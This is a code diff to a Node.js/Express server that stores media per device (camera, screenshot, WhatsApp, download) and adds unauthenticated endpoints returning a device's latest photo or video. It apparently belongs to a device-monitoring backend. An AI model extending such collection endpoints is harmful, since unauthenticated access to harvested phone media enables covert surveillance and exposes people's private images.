@@ -183,7 +183,7 @@ const MediaSchema = new mongoose.Schema({
     deviceId: { type: String, required: true, index: true },
     url: String,
     publicId: String,
-    type: String, // camera, screenshot, whatsapp, download
+    type: String, // camera, screenshot, whatsapp, download, video
     fileName: String,
     timestamp: { type: Date, default: Date.now }
 }, { timestamps: true });
@@ -480,6 +480,70 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
     }
 });
 
+// ============= 🔥 NEW: GET LATEST PHOTO =============
+app.get('/api/photo/:deviceId', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+
+        const photo = await Media.findOne({
+            deviceId,
+            type: { $regex: /camera|screenshot|whatsapp|gallery|image/i }
+        }).sort({ timestamp: -1 }).limit(1);
+
+        if (!photo) {
+            return res.status(404).json({
+                success: false,
+                message: 'No photo found'
+            });
+        }
+
+        res.json({
+            success: true,
+            url: photo.url,
+            timestamp: photo.timestamp,
+            type: photo.type
+        });
+
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// ============= 🔥 NEW: GET LATEST VIDEO =============
+app.get('/api/video/:deviceId', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+
+        const video = await Media.findOne({
+            deviceId,
+            type: { $regex: /video|movie/i }
+        }).sort({ timestamp: -1 }).limit(1);
+
+        if (!video) {
+            return res.status(404).json({
+                success: false,
+                message: 'No video found'
+            });
+        }
+
+        res.json({
+            success: true,
+            url: video.url,
+            timestamp: video.timestamp,
+            type: video.type
+        });
+
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
 // Bulk Sync
 app.post('/api/sync', async (req, res) => {
     try {
@@ -613,6 +677,8 @@ server.listen(PORT, '0.0.0.0', () => {
     ║  🔌 WebSocket: ws://localhost:8080           ║
     ║  🗄️  MongoDB: ${mongoose.connection.readyState === 1 ? '✅' : '❌'}                    ║
     ║  ☁️  Cloudinary: ${process.env.CLOUDINARY_URL ? '✅' : '❌'}              ║
+    ║  📸 Photo API: /api/photo/:deviceId         ║
+    ║  🎥 Video API: /api/video/:deviceId         ║
     ╚══════════════════════════════════════════════╝
     `);
 });
